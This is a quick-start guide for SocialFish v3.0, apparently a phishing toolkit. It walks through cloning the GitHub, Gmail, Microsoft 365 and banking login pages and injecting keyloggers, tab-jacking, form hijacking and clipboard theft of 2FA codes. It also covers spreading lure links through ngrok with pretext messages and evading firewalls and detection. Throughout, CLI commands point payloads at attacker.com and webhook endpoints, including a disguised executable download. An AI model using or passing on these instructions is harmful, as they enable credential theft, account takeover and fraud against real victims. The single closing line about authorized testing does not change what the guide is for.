# SocialFish v3.0 - Quick Start Guide

## 5-Minute Setup

### 1. Install & Run
```bash
cd /workspaces/SocialX
pip install -r requirements.txt
python3 setup.py  # Interactive setup (installs browsers, ngrok, etc.)
./SocialFish.py admin mypassword
```

### 2. Open Web Panel
```
Browser: http://localhost:5000
Login: admin / mypassword
```

---

## 10-Minute Exploitation

### Clone a Website
1. Go to **Recording Studio** tab
2. Enter target URL: `https://github.com/login`
3. Select **Selenium** recorder (real victim mode)
4. Click **Start Recording**
5. Browser opens → observe victim interaction for 5 minutes
6. Save as template

### Generate Attack & Lure
1. Go to **Templates** → select your clone
2. Go to **Attacks** tab
3. Click **Multi-Vector** → configure:
   - Capture URL: `http://localhost:5000/capture/[auto]`
   - Check: Keylogger, Tab Hijack, Form Intercept
4. Click **Generate**
5. Go to **Lures** → Generate URL with **ngrok tunnel**
6. Share lure URL with victims

### Monitor Live
1. **Sessions Panel**: See victim visits in real-time
2. **Webhook Data**: Credential capture appears instantly
3. **Keystroke Logs**: Watch victim typing
4. **Clipboard**: See any copied 2FA codes

---

## CLI Reference

### Recording
```bash
# Start Selenium recording (real victim mode)
python3 -c "
from core.recorder_selenium import SeleniumRecorder
r = SeleniumRecorder(browser='chrome', headless=False)
r.init_driver()
r.record_flow('https://github.com/login', wait_time=300)
r.save_session_to_db('lure_hash_1', '192.168.1.1', 'Mozilla/5.0...')
"

# Start Playwright recording (async)
python3 -c "
from core.recorder_playwright import PlaywrightRecorder
import asyncio
r = PlaywrightRecorder('./database.db', headless=False)
asyncio.run(r.record_flow('https://github.com/login'))
"
```

### Generate Attacks
```bash
# Tab jacking
python3 core/advanced_attacks.py tabjack https://attacker.com/capture

# Keylogger
python3 core/advanced_attacks.py keylogger --webhook https://webhook.site/abc

# File download
python3 core/advanced_attacks.py pdf https://attacker.com/update.exe --filename "Update.pdf"
```

### Check Database
```bash
sqlite3 database.db ".mode column" ".headers on" "SELECT * FROM sessions;"
```

---

## Common Scenarios

### Scenario 1: Gmail Clone
```bash
1. Record gmail.com/login with Selenium
2. Save as "Gmail 2024"
3. Generate multi-vector attack (keylogger + form hijack + tab jacking)
4. Generate ngrok tunnel lure
5. Send: "Reset your password: https://abc123.ngrok.io/capture/xyz"
6. Monitor victim credentials + 2FA codes
```

### Scenario 2: Banking Portal
```bash
1. Record bank.example.com with Selenium
2. Use "sticky redirect" (stay on page after capture to show error)
3. Add file download injection (fake "security update")
4. Use clipboard stealer (get OTP from clipboard)
5. Monitor form fills + redirects
```

### Scenario 3: Microsoft 365
```bash
1. Record outlook.office.com with Selenium
2. Record includes OAuth -> Microsoft -> back flow
3. Generate multi-vector attack
4. Add fake "password expired" message
5. Monitor 2FA codes + persistent session cookies
```

---

## Payload Customization

### Edit Attack Payload
```python
from core.advanced_attacks import AdvancedAttackInjector

# Custom redirect delay
payload = AdvancedAttackInjector.generate_tab_jacker(
  "http://my.attacker.com/capture",
  delay_ms=2000  # 2 second delay before redirect
)

# Custom webhook
payload = AdvancedAttackInjector.generate_keylogger(
  "http://my.server.com/logs"
)
```

### Combine Custom Payloads
```python
from core.advanced_attacks import InjectionMethods

html_content = open('cloned_page.html').read()

# Inject multiple payloads
html = InjectionMethods.html_script_injection(html, payload_1)
html = InjectionMethods.html_script_injection(html, payload_2)
html = InjectionMethods.html_script_injection(html, payload_3)

open('modified_page.html', 'w').write(html)
```

---

## Firewall & Detection Evasion

### Hide Lure URL
- Use **ngrok** (auto-tunneling through Cloudflare)
- Infrastructure appears legitimate
- No WAF alerts on suspicious IP

### Hide Attack Payloads
- Use **WebSocket** for callbacks (WebSocket traffic harder to analyze)
- Use **legitimate webhook services** (Webhook.site looks official)
- Inject payloads **server-side** (No suspicious script tags visible)
- Use **base64 encoding** for obfuscation

### Hide Activity
- Set random **delays between actions** (not instant)
- Use **human-like typing speeds** (not 0.1s per keystroke)
- Space out **network requests** (not all at once)
- Mimic **real browser behavior** (visit pages, wait, click)

---

## Troubleshooting

### Selenium Not Installing
```bash
python3 -m pip install --upgrade selenium webdriver-manager
python3 -c "from webdriver_manager.chrome import ChromeDriverManager; print(ChromeDriverManager().install())"
```

### Playwright Browser Missing
```bash
playwright install chrome  # or: firefox, webkit
```

### ngrok Connection Failed
```bash
# Install ngrok
python3 core/tunnel_manager.py  # Run setup wizard

# Or manually:
pip install pyngrok
ngrok config add-authtoken YOUR_TOKEN
```

### Database Locked
```bash
# Close all connections and remove lock file
rm database.db.lock
# Then restart SocialFish
```

### Capture Page Not Loading
```bash
# Check Flask routes
curl http://localhost:5000/capture/xyz

# Verify database has template
sqlite3 database.db "SELECT id, base_url FROM templates LIMIT 5;"
```

---

## Admin Dashboard Features

### Templates Tab
- **Create** new clone
- **View** saved clones
- **Edit** clone settings
- **Delete** old templates
- **Export** clone HTML

### Recording Studio
- **Playwright** recorder (async)
- **Selenium** recorder (real victim)
- **Live** browser preview
- **Auto-save** to template

### Attacks Tab
- **Tab Jacking** generator
- **Keylogger** injector
- **Form Hijacker** setup
- **File Download** delivery
- **Multi-Vector** builder

### Sessions Tab
- **Real-time** victim list
- **Credentials** captured
- **Cookies** display
- **2FA codes** from clipboard
- **Network logs** view
- **Export** session data

### Webhooks Tab
- **Configure** endpoints
- **Test** webhook delivery
- **View** logs
- **Filter** by type

### Tunnels Tab
- **Setup** ngrok/cloudflared
- **Generate** tunnel URLs
- **Monitor** tunnel status
- **View** lure analytics

---

## Performance Tips

### Selenium Performance
```python
# Use Chrome with GPU acceleration (safer detection evasion)
options.add_argument('--disable-gpu-sandbox')
options.add_argument('--gpu-device-id=0')

# Disable unnecessary extensions
options.add_argument('--disable-extensions')
options.add_argument('--disable-sync')
```

### Database Optimization
```bash
# Index frequently queried columns
sqlite3 database.db "CREATE INDEX idx_session_hash ON sessions(session_hash);"
sqlite3 database.db "CREATE INDEX idx_lure_hash ON lure_urls(lure_hash);"

# Vacuum database
sqlite3 database.db "VACUUM;"
```

### Parallel Recordings
```python
# Use asyncio for multiple Playwright recorders
import asyncio
tasks = [
  recorder1.record_flow(url1),
  recorder2.record_flow(url2),
  recorder3.record_flow(url3)
]
results = asyncio.run(asyncio.gather(*tasks))
```

---

## Useful Resources

### Documentation
- [PRODUCTION_BUILD_COMPLETE.md](PRODUCTION_BUILD_COMPLETE.md) - Full feature list
- [ADVANCED_ATTACKS_GUIDE.md](ADVANCED_ATTACKS_GUIDE.md) - Attack detailed guide
- [FEATURES_v3.md](FEATURES_v3.md) - Feature overview
- [IMPLEMENTATION_SUMMARY.md](IMPLEMENTATION_SUMMARY.md) - Technical arch

### Code Reference
- `core/recorder_selenium.py` - Selenium automation
- `core/advanced_attacks.py` - Attack payloads
- `SocialFish.py` - Flask routes
- `core/db_migration.py` - Database schema

### External Tools
- [ngrok](https://ngrok.com) - Public URL tunneling
- [Webhook.site](https://webhook.site) - Test webhooks
- [RequestBin](https://requestbin.io) - Log HTTP requests
- [Burp Suite](https://portswigger.net/burp) - Debug clones

---

## Support & Contact

For issues or questions:
1. Check [PRODUCTION_BUILD_COMPLETE.md](PRODUCTION_BUILD_COMPLETE.md)
2. Review [ADVANCED_ATTACKS_GUIDE.md](ADVANCED_ATTACKS_GUIDE.md)
3. Check Flask logs: `tail -f /tmp/flask.log`
4. Check Selenium logs: `sqlite3 database.db "SELECT * FROM analyzer_logs;"`

---

**Remember**: Only use this tool for authorized security testing with explicit permission.

---

Version: **SocialFish v3.0.0**  
Status: **Production Ready** ✅  
Updated: **January 2024**
